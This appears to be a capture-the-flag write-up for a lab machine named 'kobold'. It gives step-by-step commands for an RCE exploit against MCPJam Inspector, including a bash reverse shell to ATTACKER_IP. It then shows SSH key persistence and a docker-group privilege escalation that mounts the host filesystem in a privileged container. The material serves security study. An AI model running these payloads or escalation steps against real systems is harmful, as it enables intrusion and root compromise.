## Attack Plan

### Option A: Arcane Auth Bypass — CVE-2026-23944 ✗

**Why you tried it:**

Arcane v1.13.0 is vulnerable to an unauthenticated proxy bypass on remote environments. Version matched, seemed like the obvious path.

1. Looked up the CVE and tried proxying requests through the remote environment endpoint:
```bash
curl -sk http://kobold.htb:3552/api/proxy/REMOTE_ENV_ID/api/users
```
Result:
```
401 Unauthorized
```

2. Tried fuzzing for valid remote environment IDs:
```bash
ffuf -u http://kobold.htb:3552/api/proxy/FUZZ/api/health -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
```
Result:
```
# All 401s, no valid environment IDs found
```

**Why it failed:** Couldn't enumerate any valid remote environment IDs. The bypass only works if you can reference a real environment — without that, every request just bounces back as 401. Dead end.

---

### Option B: MCPJam Inspector RCE — CVE-2026-23744 ✓

**Why this worked:**

MCPJam Inspector v1.4.2 has an unauthenticated RCE via `/api/mcp/connect`. The endpoint takes a JSON payload where `command` and `args` get passed directly to exec with no sanitisation. The CVE reference I found used a different port/path — the actual endpoint on this box is proxied through nginx on 443, not exposed directly.

1. Start a listener:
```bash
nc -lvnp 9001
```

2. Fire the payload through the nginx proxy:
```bash
curl -sk https://mcp.kobold.htb/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1"],"env":{}},"serverId":"pwned"}'
```
Result:
```
# reverse shell received as ben
ben@kobold:~$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben),1002(operator)
```

3. Stabilised with SSH key — dropped public key into `/home/ben/.ssh/authorized_keys` and SSH'd in properly.

## Post Exploitation / Privilege Escalation

1. Enumerate users and groups:
```bash
cat /etc/passwd | grep -v nologin
id ben
id alice
```
Result:
```
ben is in: operator group
alice is in: operator + docker groups
```

2. Check Arcane service for anything useful:
```bash
cat /etc/systemd/system/arcane.service
```
Result:
```
# Arcane runs as root, encryption key visible in the service file
# Noted but not the actual privesc path
```

3. Docker socket check:
```bash
ls -la /var/run/docker.sock
```
Result:
```
srw-rw---- 1 root docker ... /var/run/docker.sock
# ben isn't in docker group, alice is
```

4. Discovered `sg` allows switching group context even without membership when the group has no password set. Used it to run docker commands as the docker group:
```bash
sg docker -c "docker ps"
```
Result:
```
# Worked — docker commands running under docker group context
```

5. Mount the host filesystem inside a container and read root flag:
```bash
sg docker -c "docker run -v /:/host -it --privileged --user root --entrypoint /bin/sh privatebin/nginx-fpm-alpine:2.0.2"
```
Result:
```
/ # id
uid=0(root) gid=0(root) groups=0(root)
/ # cat /host/root/root.txt
```

Result: `root access via container with host filesystem mounted`
